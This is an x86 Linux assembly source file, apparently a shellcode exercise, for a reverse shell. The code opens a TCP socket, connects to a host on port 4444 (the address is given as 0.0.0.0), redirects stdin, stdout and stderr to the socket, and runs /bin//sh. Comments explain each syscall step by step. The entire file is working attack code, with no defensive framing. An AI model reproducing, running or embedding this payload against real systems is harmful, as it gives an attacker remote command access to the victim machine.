; reverse_shell_vanilla.nasm
;  - Connect to a host, provide shell.

global _start

section .text
_start:
        ; int socketcall(int call, unsigned long *args)
        ; int socket(int domain, int type, int protocol)
        ; eax = 0x66 (socketcall)
        ; ebx = 0x1 (socket)
        ; ecx = esp
        ; esp => |0x00000002|0x00000001|0x00000000|
        ;          AF_INET  SOCK_STREAM    null

	push 0x0		; IPPROTO_IP
	push 0x1		; SOCK_STREAM
	push 0x2		; AF_INET
	mov eax, 0x66		; socketcall, 102
	mov ebx, 0x1		; socket, 1
	mov ecx, esp		; args
	int 0x80		; execute
	mov esi, eax		; save sockfd


	; int socketcall(int call, unsigned long *args)
        ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
        ; struct sockaddr_in {short int sin_family, unsigned short int sin_port, struct in_addr sin_addr, 0}
        ; eax = 0x66 (socketcall)
        ; ebx = 0x3 (connect)
        ; ecx = esp
        ; esp => |----------|----------|0x00000018|0x0002|0x115C|0x00000000|
        ;           sockfd      addr      addrlen  AF_INET  port   ipaddr

	push 0x00000000		; ipaddr, 0.0.0.0
	push word 0x5c11	; port, 4444
	push word 0x2		; AF_INET
	mov ecx, esp
	push 0x10		; addrlen, 16
	push ecx		; addr
	push esi		; sockfd
	mov eax, 0x66		; socketcall, 102
	mov ebx, 0x3		; connect, 3	
	mov ecx, esp		; args
	int 0x80		; execute


        ; int dup2(int oldfd, int newfd)
        ; eax = 0x3f (dup2)
        ; ebx = connfd
        ; ecx = 0x0

	mov eax, 0x3f		; dup2, 63
	mov ebx, esi		; connfd
	mov ecx, 0x0		; stdin
	int 0x80


        ; int dup2(int oldfd, int newfd)
        ; eax = 0x3f (dup2)
        ; ebx = connfd
        ; ecx = 0x1

	mov eax, 0x3f		; dup2, 63
	mov ebx, esi		; connfd
	mov ecx, 0x1		; stdout
	int 0x80


        ; int dup2(int oldfd, int newfd)
        ; eax = 0x3f (dup2)
        ; ebx = connfd
        ; ecx = 2

	mov eax, 0x3f		; dup2, 63
	mov ebx, esi		; connfd
	mov ecx, 0x2		; stderr
	int 0x80


        ; int execve(const char *filename, char *const argv[], char *const envp[])
        ; eax = 0xb
        ; ebx = [esp +8]
        ; ecx = esp
        ; edx = [esp +4]
        ; esp => |--[esp +8]--|0x00000000|0x2f62696e|0x2f2f7368|0x00000000|
        ;                                    /bin       //sh

	push 0x0
        push 0x68732f2f
        push 0x6e69622f
	mov ebx, esp
	push 0x0
	mov edx, esp
	push ebx
	mov ecx, esp
	mov eax, 0xb
	int 0x80

